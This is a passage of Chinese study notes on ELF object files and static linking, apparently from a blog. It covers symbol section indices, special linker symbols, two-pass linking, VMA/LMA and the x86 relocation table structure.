<p>符号所在段(st_shndx)<br>|宏定义名|值|说明|<br>|-|-|-|<br>|SHB_ABS|0xfff1|表示该符号包含了一个绝对值，比如文件名的符号就属于该类型|<br>|SHN_COMMON|0xfff2|表示该符号是一个”COMMON块”类型的符号，未初始化的全局符号定义就是该类型的|<br>|SHN_UNDEF|0|表示该符号未定义，表示该符号在本目标文件被引用到，但是定义在其他目标文件中|</p>
<p><strong>特殊符号</strong></p>
<ul>
<li>__executable_start，该符号为程序起始地址，不是入口地址</li>
<li>__etext或_etext或etext，表示代码段结束地址，即代码段最末尾的地址</li>
<li>_edata 或edata，数据段结束的位置</li>
<li>_end或end，程序结束位置</li>
<li>以上地址都为程序被装载时的虚拟地址</li>
</ul>
<p><strong>符号修饰与函数签名</strong><br>解决函数重名问题</p>
<h2 id="章四-静态链接"><a href="#章四-静态链接" class="headerlink" title="章四-静态链接"></a>章四-静态链接</h2><p>当我们有两个目标文件时，如何将其链接起来形成一个可执行文件，这引出了一个问题。</p>
<h3 id="空间与地址分配"><a href="#空间与地址分配" class="headerlink" title="空间与地址分配"></a>空间与地址分配</h3><ul>
<li>方案一：按序叠加。直接将各个目标文件依次合并。缺点：输出文件会有很多零散的段，段的装载地址和空间的对齐位置是页，即4096字节。如果一个段的长度只有1个字节，它也要在内存中占用4096字节，造成内存空间产生大量的内部碎片。</li>
<li>方案二：相似段合并。“链接器为目标文件分配地址和空间”，<strong>地址和空间</strong>包含两个含义：第一个是在输出的可执行文件中的空间；第二个是在装载后的虚拟地址中的虚拟地址空间。对于”.text”和”.data”段两个都要分配，而对于”.bss”这样的段，分配空间的意义只局限于虚拟地址空间，因为其在文件中无内容。</li>
</ul>
<p>可想而知，现在的链接器空间分配采用的都是方案二。使用这种方法的链接器一般都采用一种叫 <strong>“两步链接(Two-pass Linking)”</strong> 的方法.</p>
<ol>
<li>空间与地址分配：扫描所有输入目标文件，并且获得它们的各个段的长度、属性和位置，并将输入目标文件中的符号表中所有的符号定义和符号引用收集起来，同一放到一个全局符号表。链接器将各个段合并，计算出输出文件中各个段合并后的长度与位置，并建立映射关系。</li>
<li>符号解析与重定位：使用上面收集的信息，读取输入文件中段的数据、重定位信息，并进行符号解析与重定位、调整代码中的地址。</li>
</ol>
<p>VMA(Virtual Memory Address)，虚拟地址。LMA(Load Memory Address)，加载地址。正常情况下两值应该相等，但在一些嵌入式系统中，特别是将程序放在ROM的系统中，二值不同。</p>
<p>在链接前，目标文件中的所有段的VMA都是0。链接后，各个段都被分配到了相应的虚拟地址。</p>
<p>因为各符号在段内的相对位置是固定的，所以链接器需要给每个符号加上一个偏移量，使其定位到正确的虚拟地址。</p>
<h3 id="符号解析与重定位"><a href="#符号解析与重定位" class="headerlink" title="符号解析与重定位"></a>符号解析与重定位</h3><p>重定位表**(Relocation Table)** 用于保存与重定位相关的信息。对于每个需要重定位的段都一个对应的重定位表，所以 <strong>重定位表</strong> 又可以称为 <strong>重定位段</strong> 。例如，”.text”有需要重定位的地方，就会有一个相应的”.rel.text”的段保存代码段的重定位表。</p>
<p>每个要定位的地方叫一个 <strong>重定位入口(Relocation Entry)</strong> ，重定位入口的 <strong>“Offset”</strong> 表示该入口在要重定位的段中的位置。</p>
<p>对于32位的Intel x86系列处理器，重定位表的结构如下。Elf32_Rel定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">  Elf32_Addr r_offset;</span><br><span class="line">  Elf32_Word r_info;</span><br><span class="line">&#125;Elf32_Rel</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>r_offset</td>
<td>重定位入口的偏移，对于可重定位文件来说，这个值是该重定位入口索要修正的位置的第一个字节相对于段起始的偏移；对于可执行文件或共享对象文件来说，这个值是该重定位入口所要修正的位置的第一个字节的虚拟地址。</td>
</tr>
<tr>
<td>r_info</td>
<td>重定位入口的类型和符号。低8位表示重定位入口的类型，高24位表示重定位入口的符号在符号表中的下标。因各处理器的指令格式不同，重定位所修正的指令地址格式也不同，因为每种处理器都有自己一套重定位入口的类型。对于可执行文件和共享目标文件来说，它们的重定位入口是动态链接类型的。</td>
</tr>
</tbody></table>
<p><strong>指令修正方式</strong></p>
<p>寻址方式的区别：</p>
<ul>
<li>近址寻址或远址寻址</li>
<li>绝对寻址或相对寻址</li>
<li>寻址长度为8位、16位、32位或64位</li>
</ul>
<p>对于32位x86平台下的Elf文件的重定位入口所修正的指令寻址方式只有两种：</p>
<ul>
<li>绝对近址32位寻址</li>
<li>相对近址32位寻址</li>
</ul>
<p>以上两种重定位方式指令修正方式每个被修正的位置的长度都为32位，即4个字节。唯一的区别就是绝对寻址和相对寻址。</p>
]]></content>
  </entry>
</search>
